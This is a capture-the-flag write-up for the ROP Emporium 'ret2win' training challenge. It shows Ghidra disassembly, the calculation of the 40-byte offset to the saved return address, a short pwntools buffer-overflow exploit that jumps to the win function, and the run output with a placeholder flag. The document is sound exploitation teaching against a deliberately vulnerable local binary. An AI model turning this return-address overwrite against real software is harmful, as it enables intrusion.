# ret2win Writeup

## Steps:
1. Run ret2win
```
$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAA
Thank you!

Exiting
```

2. Analyze in ghidra. Notice function ret2win (we want to jump here to print the flag)
```
void ret2win(void)

{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}

                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined ret2win()
             undefined         <UNASSIGNED>   <RETURN>
                             ret2win                                         XREF[2]:     0040098c, 00400a70(*)  
        00400756 55              PUSH       RBP
        00400757 48 89 e5        MOV        RBP,RSP
        0040075a bf 26 09        MOV        EDI,s_Well_done!_Here's_your_flag:_00400926      = "Well done! Here's your flag:"
                 40 00
        0040075f e8 ec fd        CALL       <EXTERNAL>::puts                                 int puts(char * __s)
                 ff ff
        00400764 bf 43 09        MOV        EDI,s_/bin/cat_flag.txt_00400943                 = "/bin/cat flag.txt"
                 40 00
        00400769 e8 f2 fd        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
        0040076e 90              NOP
        0040076f 5d              POP        RBP
        00400770 c3              RET

```
2. Determine the distance to the return. `0x28` means we need `40 bytes` of garbage to reach the return pointer
> Information provided in instructions: It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the x86_64 binaries, 44 bytes in the x86 binaries and around 36 bytes in the ARMv5 & MIPS binaries. 
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined pwnme()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x28]:1 local_28                                XREF[2]:     004006f0(*), 
                                                                                                   00400733(*)  
                             pwnme                                           XREF[3]:     main:004006d2(c), 00400984, 
                                                                                          00400a50(*)  
        004006e8 55              PUSH       RBP
```

3. Create the payload ~ 40 bytes of garbage then new address to jump to
```
from pwn import *

p = process('./ret2win')

context.bits=64

addr = 0x00400757

payload = b"A" * 40
payload += p64(addr)

p.sendline(payload)

p.interactive()
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './ret2win': pid 12494
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ exit
[*] Process './ret2win' stopped with exit code 0 (pid 12494)
[*] Got EOF while sending in interactive
```
